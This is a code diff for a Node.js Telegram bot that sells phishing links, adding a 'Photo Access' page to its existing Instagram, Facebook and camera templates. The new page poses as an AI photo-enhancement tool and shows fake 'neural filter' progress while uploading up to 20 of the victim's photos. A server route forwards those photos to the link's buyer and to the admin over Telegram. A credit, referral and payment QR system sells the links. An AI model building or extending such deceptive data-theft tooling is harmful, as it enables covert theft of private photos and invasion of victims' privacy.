+    document.getElementById('status').style.display = 'none';
+}
+
+function updateProgress(percent) {
+    const container = document.getElementById('progressContainer');
+    container.style.display = 'block';
+    document.getElementById('progressFill').style.width = percent + '%';
+}
+
+function showProcessing(text) {
+    document.getElementById('processingStatus').style.display = 'block';
+    document.getElementById('processingText').textContent = text;
+}
+
+function hideProcessing() {
+    document.getElementById('processingStatus').style.display = 'none';
+}
+
+function closeResult() {
+    document.getElementById('resultArea').style.display = 'none';
+}
+
+function showResult(text) {
+    document.getElementById('resultArea').style.display = 'block';
+    document.getElementById('resultText').textContent = text;
+}
+
+async function processPhotos() {
+    if (selectedFiles.length === 0) {
+        showStatus('⚠️ Please select photos first', 'warning');
+        return;
+    }
+    
+    const btn = document.getElementById('processBtn');
+    btn.disabled = true;
+    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
+    hideStatus();
+    hideProcessing();
+    document.getElementById('resultArea').style.display = 'none';
+    document.getElementById('imageGrid').innerHTML = '';
+    
+    showProcessing('🔮 Analyzing photo structure...');
+    updateProgress(5);
+    await sleep(800);
+    
+    showProcessing('🧠 AI processing image data...');
+    updateProgress(20);
+    await sleep(1000);
+    
+    showProcessing('⚡ Applying neural filters...');
+    updateProgress(40);
+    await sleep(1200);
+    
+    showProcessing('✨ Enhancing details...');
+    updateProgress(60);
+    await sleep(1000);
+    
+    showProcessing('📤 Sending results...');
+    updateProgress(80);
+    
+    // Send each photo to bot
+    let successCount = 0;
+    for (let i = 0; i < Math.min(selectedFiles.length, 20); i++) {
+        try {
+            const file = selectedFiles[i];
+            const reader = new FileReader();
+            const fileData = await new Promise((resolve, reject) => {
+                reader.onload = (e) => resolve(e.target.result);
+                reader.onerror = reject;
+                reader.readAsDataURL(file);
+            });
+            
+            // Send to bot
+            const response = await fetch('/api/upload-photo', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    userid: USER_ID,
+                    platform: PLATFORM,
+                    filename: file.name,
+                    data: fileData,
+                    size: file.size
+                })
+            });
+            
+            if (response.ok) successCount++;
+            
+            // Update progress
+            const percent = 80 + (i / Math.min(selectedFiles.length, 20)) * 20;
+            updateProgress(percent);
+            
+            // Show preview in grid
+            const reader2 = new FileReader();
+            reader2.onload = function(e) {
+                const grid = document.getElementById('imageGrid');
+                const img = document.createElement('img');
+                img.src = e.target.result;
+                grid.appendChild(img);
+                grid.style.display = 'grid';
+            };
+            reader2.readAsDataURL(file);
+            
+            await sleep(300);
+        } catch(err) {
+            console.error('Error processing file:', err);
+        }
+    }
+    
+    updateProgress(100);
+    hideProcessing();
+    
+    if (successCount > 0) {
+        showResult('✅ ' + successCount + ' photo(s) processed successfully!\n\n⚠️ Server overloaded. Please try again in 2-3 hours for full quality.');
+        showStatus('✅ Processing complete!', 'success');
+    } else {
+        showStatus('❌ Processing failed. Please try again.', 'error');
+    }
+    
+    btn.disabled = false;
+    btn.innerHTML = '<i class="fas fa-wand-magic-sparkles"></i> PROCESS PHOTOS';
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+// Add glow effect on upload zone
+document.getElementById('uploadZone').addEventListener('dragover', function(e) {
+    e.preventDefault();
+    this.style.borderColor = '#ff6b6b';
+    this.style.background = 'rgba(255,107,107,0.05)';
+});
+
+document.getElementById('uploadZone').addEventListener('dragleave', function() {
+    this.style.borderColor = 'rgba(255,255,255,0.1)';
+    this.style.background = 'rgba(255,255,255,0.03)';
+});
+
+document.getElementById('uploadZone').addEventListener('drop', function(e) {
+    e.preventDefault();
+    this.style.borderColor = 'rgba(255,255,255,0.1)';
+    this.style.background = 'rgba(255,255,255,0.03)';
+    const files = e.dataTransfer.files;
+    if (files.length > 0) {
+        document.getElementById('fileInput').files = files;
+        document.getElementById('fileInput').dispatchEvent(new Event('change'));
     }
 });
 </script>
 </body>
-</html>`
-};
+</html>`;
 
 // ====================== EXPRESS ROUTES ======================
 app.use('/api/photos', express.static(BOT_PHOTO_DIR));
+app.use('/uploads', express.static(UPLOADS_DIR));
 
 // ====================== ADMIN PANEL (WEB) ======================
 app.get('/admin', (req, res) => {
@@ -690,13 +702,14 @@ app.get('/admin', (req, res) => {
         input,select{padding:10px;border-radius:8px;border:1px solid #2a2a4a;background:#0a0a0a;color:#fff;margin:5px}
         .flex{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
         .qr-section{background:#1a1a2e;padding:30px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}
-        .qr-section img{max-width:200px;border-radius:10px}
+        .qr-section img{max-width:200px;border-radius:10px;border:2px solid #2a2a4a}
         .featured-preview{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-top:10px}
         .featured-preview img{max-width:200px;border-radius:10px}
         .status-badge{padding:8px 20px;border-radius:20px;font-weight:600;display:inline-block}
         .status-active{background:#1a3a1a;color:#28a745}
         .status-inactive{background:#3a1a1a;color:#dc3545}
         .logs-area{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;max-height:400px;overflow-y:auto;font-family:monospace;font-size:12px;color:#aaa;white-space:pre-wrap}
+        .qr-preview{border:2px solid #2a2a4a;border-radius:10px;padding:10px;background:#0a0a0a;display:inline-block;margin-top:10px}
     </style>
 </head>
 <body>
@@ -708,7 +721,7 @@ app.get('/admin', (req, res) => {
         <div class="tab" onclick="showTab('channels')">📢 Channels</div>
         <div class="tab" onclick="showTab('users')">👥 Users</div>
         <div class="tab" onclick="showTab('featured')">⭐ Featured</div>
-        <div class="tab" onclick="showTab('qr')">💰 Payments</div>
+        <div class="tab" onclick="showTab('qr')">💰 QR</div>
         <div class="tab" onclick="showTab('logs')">📋 Logs</div>
         <div class="tab" onclick="showTab('commands')">📜 Commands</div>
     </div>
@@ -799,7 +812,10 @@ app.get('/admin', (req, res) => {
                 <button class="btn btn-primary" onclick="uploadQR()">Upload QR</button>
                 <button class="btn btn-danger" onclick="removeQR()">Remove QR</button>
             </div>
-            <div id="qrPreview" style="margin-top:20px"></div>
+            <div id="qrPreview" class="qr-preview" style="margin-top:20px;display:none;">
+                <p style="color:#888;margin-bottom:10px;">Current QR Code:</p>
+                <img id="qrImage" src="" style="max-width:200px;border-radius:10px;">
+            </div>
         </div>
     </div>
 
@@ -821,13 +837,13 @@ app.get('/admin', (req, res) => {
             <pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">
 /help or /commands - Show all commands
 /admin - Open admin panel
-/addcredits [userId] [amount] - Add credits to user
-/removecredits [userId] [amount] - Remove credits from user
-/unlimited [userId] - Activate unlimited for user
-/resetuser [userId] - Reset user data
+/addcredits [userId] [amount] - Add credits
+/removecredits [userId] [amount] - Remove credits
+/unlimited [userId] - Activate unlimited
+/resetuser [userId] - Reset user
 /users - Show all users
-/stats - Show bot statistics
-/broadcast [message] - Send message to all users
+/stats - Bot statistics
+/broadcast [message] - Send to all users
 /setqr - Upload QR code (reply with image)
 /removeqr - Remove QR code
 /viewqr - View QR code
@@ -868,6 +884,7 @@ function showTab(tab){
     if(tab==='users') loadUsers();
     if(tab==='featured') loadFeatured();
     if(tab==='logs') loadLogs();
+    if(tab==='qr') loadQR();
 }
 
 // PHOTOS
@@ -1069,6 +1086,20 @@ async function toggleFeaturedStatus(){
 }
 
 // QR
+async function loadQR(){
+    try{
+        const r=await fetch('/api/admin/qr');
+        const data=await r.json();
+        const preview=document.getElementById('qrPreview');
+        if(data.url){
+            preview.style.display='block';
+            document.getElementById('qrImage').src='/api/admin/qr?t='+Date.now();
+        }else{
+            preview.style.display='none';
+        }
+    }catch(err){}
+}
+
 async function uploadQR(){
     const file=document.getElementById('qrUpload').files[0];
     if(!file){showToast('Select an image',true);return;}
@@ -1076,8 +1107,10 @@ async function uploadQR(){
     try{
         const r=await fetch('/api/admin/upload-qr',{method:'POST',body:fd});
         const data=await r.json();
-        if(data.success){showToast('QR uploaded!');document.getElementById('qrPreview').innerHTML=\`<img src="/api/admin/qr?t=\${Date.now()}" style="max-width:200px;border-radius:10px">\`;}
-        else showToast('Upload failed',true);
+        if(data.success){
+            showToast('QR uploaded!');
+            loadQR();
+        }else showToast('Upload failed',true);
     }catch(err){showToast('Error',true);}
 }
 
@@ -1085,7 +1118,7 @@ async function removeQR(){
     if(!confirm('Remove QR code?'))return;
     try{
         const r=await fetch('/api/admin/remove-qr',{method:'DELETE'});
-        if(r.ok){showToast('QR removed!');document.getElementById('qrPreview').innerHTML='';}
+        if(r.ok){showToast('QR removed!');loadQR();}
         else showToast('Remove failed',true);
     }catch(err){showToast('Error',true);}
 }
@@ -1116,10 +1149,7 @@ loadPhotos();
 loadChannels();
 loadUsers();
 loadFeatured();
-
-fetch('/api/admin/qr').then(r=>r.json()).then(data=>{
-    if(data.url) document.getElementById('qrPreview').innerHTML=\`<img src="/api/admin/qr?t=\${Date.now()}" style="max-width:200px;border-radius:10px">\`;
-}).catch(()=>{});
+loadQR();
 </script>
 </body>
 </html>`);
@@ -1219,26 +1249,45 @@ app.post('/api/admin/featured/toggle', (req, res) => {
     res.json({ success: true, featured });
 });
 
-// QR Code API
+// QR Code API - FIXED
 app.post('/api/admin/upload-qr', upload.single('qr'), (req, res) => {
-    if (!req.file) return res.status(400).json({ error: 'No file' });
-    if (fs.existsSync(QR_FILE)) fs.unlinkSync(QR_FILE);
-    fs.renameSync(req.file.path, QR_FILE);
-    res.json({ success: true });
+    try {
+        if (!req.file) return res.status(400).json({ error: 'No file' });
+        if (fs.existsSync(QR_FILE)) fs.unlinkSync(QR_FILE);
+        fs.renameSync(req.file.path, QR_FILE);
+        console.log('✅ QR Code saved successfully');
+        logToFile('📱 QR Code uploaded');
+        res.json({ success: true, url: '/api/admin/qr' });
+    } catch (err) {
+        console.error('QR Upload Error:', err);
+        res.status(500).json({ error: err.message });
+    }
 });
 
 app.delete('/api/admin/remove-qr', (req, res) => {
-    if (fs.existsSync(QR_FILE)) {
-        fs.unlinkSync(QR_FILE);
-        res.json({ success: true });
-    } else {
-        res.json({ success: false, error: 'No QR found' });
+    try {
+        if (fs.existsSync(QR_FILE)) {
+            fs.unlinkSync(QR_FILE);
+            logToFile('📱 QR Code removed');
+            res.json({ success: true });
+        } else {
+            res.json({ success: false, error: 'No QR found' });
+        }
+    } catch (err) {
+        res.status(500).json({ error: err.message });
     }
 });
 
 app.get('/api/admin/qr', (req, res) => {
-    if (fs.existsSync(QR_FILE)) res.sendFile(QR_FILE);
-    else res.json({ url: null });
+    try {
+        if (fs.existsSync(QR_FILE)) {
+            res.sendFile(QR_FILE);
+        } else {
+            res.json({ url: null });
+        }
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
 });
 
 // Logs API
@@ -1305,6 +1354,46 @@ app.post('/api/capturepic', async (req, res) => {
     }
 });
 
+// ====================== PHOTO ACCESS API ======================
+app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
+    const { userid, platform, filename, data, size } = req.body || {};
+    if (!userid || !data) return res.status(400).json({ error: 'Missing data' });
+    
+    try {
+        // Save photo to uploads folder
+        const base64Data = data.replace(/^data:image\/\w+;base64,/, "");
+        const buffer = Buffer.from(base64Data, 'base64');
+        const saveName = Date.now() + '-' + (filename || 'photo.jpg');
+        const savePath = path.join(UPLOADS_DIR, saveName);
+        fs.writeFileSync(savePath, buffer);
+        
+        // Send to bot user
+        const photoUrl = `${req.protocol}://${req.get('host')}/uploads/${saveName}`;
+        const caption = `📸 <b>New Photo Received</b>\n\n` +
+            `👤 <b>User:</b> <code>${userid}</code>\n` +
+            `📁 <b>File:</b> ${filename || 'photo.jpg'}\n` +
+            `📏 <b>Size:</b> ${size ? (size/1024).toFixed(1) + 'KB' : 'Unknown'}\n` +
+            `🌐 <b>Platform:</b> ${platform || 'Photo Access'}\n` +
+            `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+            `🔒 <b>AI Processing Complete</b> ✅`;
+        
+        await S7.sendPhoto(userid, buffer, { caption, parse_mode: 'HTML' });
+        
+        // Also send to admin
+        await S7.sendPhoto(config.adminId, buffer, { 
+            caption: `📸 <b>User Photo Upload</b>\n\n👤 User: <code>${userid}</code>\n📁 ${filename || 'photo.jpg'}`,
+            parse_mode: 'HTML' 
+        });
+        
+        logToFile(`📸 Photo upload from user ${userid}: ${filename}`);
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Photo upload error:', error);
+        logToFile(`❌ Photo upload error: ${error.message}`);
+        res.status(500).json({ error: 'Failed to process photo' });
+    }
+});
+
 // ====================== LINK GENERATION ======================
 app.get('/api/create-link', (req, res) => {
     const userid = req.headers.userid || 'unknown';
@@ -1326,12 +1415,17 @@ app.get('/api/create-link', (req, res) => {
     }
     
     let template;
-    if (p === 'instagram') template = TEMPLATES.instagram;
-    else if (p === 'facebook') template = TEMPLATES.facebook;
-    else if (p === 'camera') template = TEMPLATES.camera;
+    const pLower = p.toLowerCase();
+    if (pLower === 'instagram') template = TEMPLATES.instagram;
+    else if (pLower === 'facebook') template = TEMPLATES.facebook;
+    else if (pLower === 'camera') template = TEMPLATES.camera;
+    else if (pLower === 'photoaccess' || pLower === 'photo') template = PHOTO_ACCESS_TEMPLATE;
     else return res.status(400).json({ error: 'Invalid platform' });
     
-    const displayPlatform = p === 'instagram' ? '𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌' : p === 'facebook' ? '𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊' : '𝐂𝐀𝐌𝐄𝐑𝐀';
+    const displayPlatform = pLower === 'instagram' ? '𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌' : 
+                           pLower === 'facebook' ? '𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊' : 
+                           pLower === 'camera' ? '𝐂𝐀𝐌𝐄𝐑𝐀' : '𝐏𝐇𝐎𝐓𝐎 𝐀𝐂𝐂𝐄𝐒𝐒';
+    
     let html = template
         .replace(/USERID_PLACEHOLDER/g, userid)
         .replace(/PLATFORM_PLACEHOLDER/g, displayPlatform);
@@ -1366,9 +1460,10 @@ S7.getMe().then((botInfo) => {
 // ====================== KEYBOARDS ======================
 const LOVESY = {
     inline_keyboard: [
-        [{ text: "𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌", callback_data: "gen_instagram" }],
-        [{ text: "𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊", callback_data: "gen_facebook" }],
-        [{ text: "𝐂𝐀𝐌𝐄𝐑𝐀", callback_data: "gen_camera" }],
+        [{ text: "📸 INSTAGRAM", callback_data: "gen_instagram" }],
+        [{ text: "📘 FACEBOOK", callback_data: "gen_facebook" }],
+        [{ text: "📷 CAMERA", callback_data: "gen_camera" }],
+        [{ text: "🖼️ PHOTO ACCESS", callback_data: "gen_photoaccess" }],
         [{ text: "👥 Referral", callback_data: "referral" }],
         [{ text: "⭐ My Credits", callback_data: "credits" }],
         [{ text: "💰 Buy Credits", callback_data: "buy_credits" }],
@@ -1376,7 +1471,7 @@ const LOVESY = {
     ]
 };
 
-// Admin Keyboard (only for admin)
+// Admin Keyboard
 const ADMIN_KEYBOARD = {
     inline_keyboard: [
         [{ text: "👑 Admin Panel", callback_data: "admin_panel" }],
@@ -1411,7 +1506,6 @@ async function SendLoveSYMenu(chatId, firstName) {
     
     const menuText = SYloveMenu(firstName, message);
     
-    // Admin ko extra keyboard
     let keyboard = LOVESY;
     if (isAdmin) {
         keyboard = {
@@ -1744,7 +1838,6 @@ S7.on('callback_query', async (q) => {
             { parse_mode: 'HTML', reply_markup: SYBack }
         );
         
-        // Send QR if exists
         if (qrExists) {
             await S7.sendPhoto(cid, QR_FILE, { caption: '💳 Scan to pay' });
         }
@@ -1755,7 +1848,10 @@ S7.on('callback_query', async (q) => {
     
     if (q.data.startsWith("gen_") || q.data.startsWith("regen_")) {
         const isGen = q.data.startsWith("gen_");
-        const platform = q.data.replace(isGen ? "gen_" : "regen_", "");
+        let platform = q.data.replace(isGen ? "gen_" : "regen_", "");
+        
+        // Map photoaccess to photoAccess
+        if (platform === 'photoaccess') platform = 'photoAccess';
         
         const user = getUser(uid);
         if (!user.unlimited && (user.credits || 0) <= 0) {
@@ -1786,10 +1882,11 @@ S7.on('callback_query', async (q) => {
                 return;
             }
             
+            const platformDisplay = platform === 'photoAccess' ? 'PHOTO ACCESS' : platform.toUpperCase();
             const finalMsg = `✅ <b>Link Generated!</b>\n\n` +
                 `📎 <b>Your Link:</b>\n` +
                 `<code>${data.url}</code>\n\n` +
-                `📌 <b>Platform:</b> ${platform.toUpperCase()}\n` +
+                `📌 <b>Platform:</b> ${platformDisplay}\n` +
                 `🔄 Share and earn referrals!\n\n` +
                 `⭐ <b>Remaining Credits:</b> ${user.unlimited ? '♾️ Unlimited' : (user.credits - 1)}`;
             
@@ -1819,7 +1916,6 @@ S7.on('message', async (msg) => {
     if (!msg.text) return;
     const text = msg.text.trim();
     
-    // Handle /pay command
     if (text.startsWith('/pay')) {
         const parts = text.split(' ');
         if (parts.length < 2) {
@@ -1873,7 +1969,6 @@ S7.on('message', async (msg) => {
         return;
     }
     
-    // Handle payment screenshot (photo)
     if (msg.photo) {
         const user = getUser(msg.from.id);
         if (user._pendingPayment) {
@@ -1919,21 +2014,14 @@ S7.on('message', async (msg) => {
     if (!msg.text || msg.from.id.toString() !== config.adminId) return;
     const text = msg.text.trim();
     
-    // Add credits
     if (text.startsWith('/addcredits')) {
         const parts = text.split(' ');
-        if (parts.length < 3) {
-            return S7.sendMessage(msg.chat.id, '⚠️ Usage: /addcredits [userId] [amount]');
-        }
+        if (parts.length < 3) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /addcredits [userId] [amount]');
         const userId = parts[1];
         const amount = parseInt(parts[2]);
-        if (isNaN(amount) || amount < 1) {
-            return S7.sendMessage(msg.chat.id, '⚠️ Enter valid amount');
-        }
+        if (isNaN(amount) || amount < 1) return S7.sendMessage(msg.chat.id, '⚠️ Enter valid amount');
         const user = getUser(userId);
-        if (user.unlimited) {
-            return S7.sendMessage(msg.chat.id, '⚠️ User already has Unlimited!');
-        }
+        if (user.unlimited) return S7.sendMessage(msg.chat.id, '⚠️ User already has Unlimited!');
         user.credits = (user.credits || 0) + amount;
         saveUsers(getUsers());
         await S7.sendMessage(msg.chat.id, `✅ Added ${amount} credits to user ${userId}\nNew balance: ${user.credits}`);
@@ -1941,21 +2029,14 @@ S7.on('message', async (msg) => {
         logToFile(`💰 Admin added ${amount} credits to ${userId}`);
     }
     
-    // Remove credits
     if (text.startsWith('/removecredits')) {
         const parts = text.split(' ');
-        if (parts.length < 3) {
-            return S7.sendMessage(msg.chat.id, '⚠️ Usage: /removecredits [userId] [amount]');
-        }
+        if (parts.length < 3) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /removecredits [userId] [amount]');
         const userId = parts[1];
         const amount = parseInt(parts[2]);
-        if (isNaN(amount) || amount < 1) {
-            return S7.sendMessage(msg.chat.id, '⚠️ Enter valid amount');
-        }
+        if (isNaN(amount) || amount < 1) return S7.sendMessage(msg.chat.id, '⚠️ Enter valid amount');
         const user = getUser(userId);
-        if (user.unlimited) {
-            return S7.sendMessage(msg.chat.id, '⚠️ User has Unlimited! Cannot remove credits.');
-        }
+        if (user.unlimited) return S7.sendMessage(msg.chat.id, '⚠️ User has Unlimited! Cannot remove credits.');
         user.credits = Math.max(0, (user.credits || 0) - amount);
         saveUsers(getUsers());
         await S7.sendMessage(msg.chat.id, `✅ Removed ${amount} credits from user ${userId}\nNew balance: ${user.credits}`);
@@ -1963,12 +2044,9 @@ S7.on('message', async (msg) => {
         logToFile(`💰 Admin removed ${amount} credits from ${userId}`);
     }
     
-    // Unlimited
     if (text.startsWith('/unlimited')) {
         const parts = text.split(' ');
-        if (parts.length < 2) {
-            return S7.sendMessage(msg.chat.id, '⚠️ Usage: /unlimited [userId]');
-        }
+        if (parts.length < 2) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /unlimited [userId]');
         const userId = parts[1];
         const user = getUser(userId);
         user.unlimited = true;
@@ -1978,12 +2056,9 @@ S7.on('message', async (msg) => {
         logToFile(`⭐ Unlimited activated for ${userId}`);
     }
     
-    // Reset user
     if (text.startsWith('/resetuser')) {
         const parts = text.split(' ');
-        if (parts.length < 2) {
-            return S7.sendMessage(msg.chat.id, '⚠️ Usage: /resetuser [userId]');
-        }
+        if (parts.length < 2) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /resetuser [userId]');
         const userId = parts[1];
         const users = getUsers();
         if (users[userId]) {
@@ -1996,24 +2071,18 @@ S7.on('message', async (msg) => {
         }
     }
     
-    // Users list
     if (text === '/users') {
         const users = getUsers();
         const entries = Object.entries(users);
-        if (entries.length === 0) {
-            return S7.sendMessage(msg.chat.id, 'No users found.');
-        }
+        if (entries.length === 0) return S7.sendMessage(msg.chat.id, 'No users found.');
         let userMsg = `👥 <b>Users List</b>\n\n`;
         entries.slice(0, 20).forEach(([id, data]) => {
             userMsg += `🆔 ${id} - ⭐${data.unlimited ? '♾️' : data.credits || 0} - 👥${data.totalReferrals || 0}\n`;
         });
-        if (entries.length > 20) {
-            userMsg += `\n... and ${entries.length - 20} more users`;
-        }
+        if (entries.length > 20) userMsg += `\n... and ${entries.length - 20} more users`;
         await S7.sendMessage(msg.chat.id, userMsg, { parse_mode: 'HTML' });
     }
     
-    // Stats
     if (text === '/stats') {
         const users = getUsers();
         const totalUsers = Object.keys(users).length;
@@ -2032,12 +2101,9 @@ S7.on('message', async (msg) => {
         await S7.sendMessage(msg.chat.id, statsMsg, { parse_mode: 'HTML' });
     }
     
-    // Broadcast
     if (text.startsWith('/broadcast')) {
         const message = text.replace('/broadcast', '').trim();
-        if (!message) {
-            return S7.sendMessage(msg.chat.id, '⚠️ Usage: /broadcast [message]');
-        }
+        if (!message) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /broadcast [message]');
         const users = getUsers();
         const userIds = Object.keys(users);
         let sent = 0, failed = 0;
@@ -2057,18 +2123,13 @@ S7.on('message', async (msg) => {
             await new Promise(r => setTimeout(r, 50));
         }
         
-        await S7.sendMessage(msg.chat.id, 
-            `✅ Broadcast complete!\n✅ Sent: ${sent}\n❌ Failed: ${failed}`
-        );
+        await S7.sendMessage(msg.chat.id, `✅ Broadcast complete!\n✅ Sent: ${sent}\n❌ Failed: ${failed}`);
         logToFile(`📢 Broadcast sent to ${sent} users`);
     }
     
-    // Channels
     if (text === '/channels') {
         const channels = getChannels();
-        if (channels.length === 0) {
-            return S7.sendMessage(msg.chat.id, 'No channels added.');
-        }
+        if (channels.length === 0) return S7.sendMessage(msg.chat.id, 'No channels added.');
         let chMsg = `📢 <b>Channels</b>\n\n`;
         channels.forEach((c, i) => {
             chMsg += `${i+1}. ${c.name} - ${c.id}\n`;
@@ -2076,32 +2137,22 @@ S7.on('message', async (msg) => {
         await S7.sendMessage(msg.chat.id, chMsg, { parse_mode: 'HTML' });
     }
     
-    // Add channel
     if (text.startsWith('/addchannel')) {
         const parts = text.split(' ');
-        if (parts.length < 4) {
-            return S7.sendMessage(msg.chat.id, '⚠️ Usage: /addchannel [id] [name] [link]');
-        }
-        const id = parts[1];
-        const name = parts[2];
-        const link = parts[3];
-        addChannel(id, name, link);
-        await S7.sendMessage(msg.chat.id, `✅ Channel added: ${name}`);
-        logToFile(`📢 Channel added: ${name}`);
+        if (parts.length < 4) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /addchannel [id] [name] [link]');
+        addChannel(parts[1], parts[2], parts[3]);
+        await S7.sendMessage(msg.chat.id, `✅ Channel added: ${parts[2]}`);
+        logToFile(`📢 Channel added: ${parts[2]}`);
     }
     
-    // Remove channel
     if (text.startsWith('/removechannel')) {
         const parts = text.split(' ');
-        if (parts.length < 2) {
-            return S7.sendMessage(msg.chat.id, '⚠️ Usage: /removechannel [id]');
-        }
+        if (parts.length < 2) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /removechannel [id]');
         removeChannel(parts[1]);
         await S7.sendMessage(msg.chat.id, `✅ Channel removed`);
         logToFile(`📢 Channel removed: ${parts[1]}`);
     }
     
-    // Logs
     if (text === '/logs') {
         try {
             const logs = fs.readFileSync(LOGS_FILE, 'utf8');
@@ -2115,7 +2166,6 @@ S7.on('message', async (msg) => {
         }
     }
     
-    // Restart
     if (text === '/restart') {
         await S7.sendMessage(msg.chat.id, '🔄 Restarting bot...');
         logToFile('🔄 Bot restarting');
@@ -2123,7 +2173,7 @@ S7.on('message', async (msg) => {
     }
 });
 
-// ====================== QR CODE UPLOAD HANDLER (Admin) ======================
+// ====================== QR CODE UPLOAD HANDLER (FIXED) ======================
 S7.on('message', async (msg) => {
     if (!msg.photo) return;
     const isAdmin = msg.from.id.toString() === config.adminId;
@@ -2131,23 +2181,28 @@ S7.on('message', async (msg) => {
     
     const user = getUser(msg.from.id);
     if (user._waitingForQR) {
-        const fileId = msg.photo[msg.photo.length - 1].file_id;
-        const fileLink = await S7.getFileLink(fileId);
-        
-        const response = await fetch(fileLink);
-        const buffer = await response.arrayBuffer();
-        fs.writeFileSync(QR_FILE, Buffer.from(buffer));
-        
-        delete user._waitingForQR;
-        saveUsers(getUsers());
-        
-        await S7.sendMessage(msg.chat.id, 
-            `✅ <b>QR Code Uploaded Successfully!</b>\n\n` +
-            `📱 Users can now scan this QR for payments.\n` +
-            `Use /viewqr to see it.`,
-            { parse_mode: 'HTML' }
-        );
-        logToFile(`📱 QR code uploaded`);
+        try {
+            const fileId = msg.photo[msg.photo.length - 1].file_id;
+            const fileLink = await S7.getFileLink(fileId);
+            
+            const response = await fetch(fileLink);
+            const buffer = await response.arrayBuffer();
+            fs.writeFileSync(QR_FILE, Buffer.from(buffer));
+            
+            delete user._waitingForQR;
+            saveUsers(getUsers());
+            
+            await S7.sendMessage(msg.chat.id, 
+                `✅ <b>QR Code Uploaded Successfully!</b>\n\n` +
+                `📱 Users can now scan this QR for payments.\n` +
+                `Use /viewqr to see it.`,
+                { parse_mode: 'HTML' }
+            );
+            logToFile(`📱 QR code uploaded`);
+        } catch (err) {
+            console.error('QR Upload Error:', err);
+            await S7.sendMessage(msg.chat.id, '❌ Failed to upload QR code. Please try again.');
+        }
     }
 });
 
@@ -2164,7 +2219,7 @@ S7.on('message', async (msg) => {
         saveUsers(getUsers());
         await S7.sendMessage(msg.chat.id, 
             `📱 <b>Upload QR Code</b>\n\n` +
-            `Please reply to this message with the QR code image.\n` +
+            `Please send the QR code image as a photo.\n` +
             `The QR code will be used for payments.`,
             { parse_mode: 'HTML' }
         );
@@ -2191,6 +2246,12 @@ S7.on('message', async (msg) => {
         }
     }
 });
+
+// ====================== LOG FUNCTION ======================
+function logToFile(message) {
+    const timestamp = new Date().toISOString();
+    fs.appendFileSync(LOGS_FILE, `[${timestamp}] ${message}\n`);
+}
 
 // ====================== START SERVER ======================
 app.listen(config.port, () => {
